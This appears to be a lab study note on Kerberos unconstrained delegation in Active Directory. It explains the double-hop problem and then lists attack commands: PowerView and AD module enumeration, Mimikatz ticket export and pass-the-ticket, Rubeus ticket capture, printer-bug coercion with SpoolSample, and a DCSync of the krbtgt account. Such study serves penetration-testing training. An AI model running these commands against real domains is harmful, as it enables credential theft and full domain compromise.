# Kerberose Delegation
Delegation means the assignment of authority to another person. for example from a manager to a subordinate) to carry out specific activities. Here, suppose our compromised or initial user student1 has admin rights over dcorp-adminsrv machine we enter the dcorp-adminsrv using powershell remoting but when we run commands like ```net user /domain``` on dcorp-adminsv machine it will say access denied why? this is because of classic kerberos double hop issue since the above command ```net user /domain``` will send request to the dc for the output but since we accessed dcorp-adminsrv machine through credentials of student1 user, here the dcorp-adminsrv machine will not delegate the credentials to the third machine which is the dc. Similarly suppose user student1 wants to access the web service on internal environment he/she will request a tgt from dc then ask for ST for web service SPN, then he/she will send both the TGT and ST to the web service server and connect to the website to see his/her information here the web service has to delegate the credentials of student1 to the database server and only display the information student1 is supposed to access as opposed to an administrator due to this issue microsoft introduced unconstrained delegation where user impersonation takes place.

# Unconstrained delegation

For example student1 user would like to access web service on internal corp. Just like normal kerberos process 
- The user asks for TGT at first to the domain controller
- The DC returns TGT.
- The user requests ST for web service by sending the TGT to ticket granting server
- The user gets the ST
- The user sends the TGT and ST to the web service asking for access

After this, here the server has to determine the type of user is it normal user maybe manager maybe an administrator? just as above issue the web service computer is unable to delegate the credential of student1 to the database server computer as it needs to figure out what contents(dynamic content) to display student1, what should be shown and what shouldn't so

- The web server service uses student1's earlier provided TGT.
- The web server service sends the student1's TGT to the DC and requests ST for the database server on behalf of student'1
- The web service completes the user impersonation and connects to the database server for displaying information for student1.

# The problem with this arthitecture
The problem with this architecture is that since the web service server uses student1's earlier provided TGT to request ST for database server on behalf of student1, the web service server has TGT of every user that connects to it on its memory. It can be that administrator user, manager, student1 whoever access the website his/her TGT is stored in the memory of web service server and anyone with an administrator access to it can extract the TGT.

# Step
- We try to check if any server in the target environment has unconstrained delegation
- We try to compromise that server
- We would either wait or trick a high privileged user to connect or access the server.
- Steal the high privilege user's TGT
- Since TGT is client's identity we can access other resources or server as that client.

- Discover domain computers which have unconstrained delegation enabled usingPowerView:
```
Get-DomainComputer -UnConstrained
```
- Using ActiveDirectorymodule:
```
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```
- Export their ticket after compromsing the machine
```
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```
- Use it
```
Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```

# Unconstrained delegation Printer Bug
Recently discovered a feature of MS-RPRN which allows any authenticated domain user can force any machine running spooler service to connect to a second machine of the user's choice. In lab we can force the domain controller to connect to dcorp-appsrv where unconstrained delegation is enabled.We can then get the machine account dcorp-dc$ hash and we can run dcsync attack or create silver ticket(command exeution, service access, etc).

- We can capture the TGT of dcorp-dc$ by using Rubeus on dcorp-appsrv:
```
Rubeus.exe monitor /interval:5 /targetuser:dcorp-dc$ /nowrap
```
- And after that run MS-RPRN.exe, (https://github.com/leechristensen/SpoolSample) on the student VM:
```
MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```
- Copy the base64 encoded TGT, remove extra spaces (if any) and use it on the student VM:
```
Rubeus.exe ptt /tikcet:<base-64ticket>
```
- Once the ticket is injected, check using ```klist``` and then run DCSync:
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"' 
```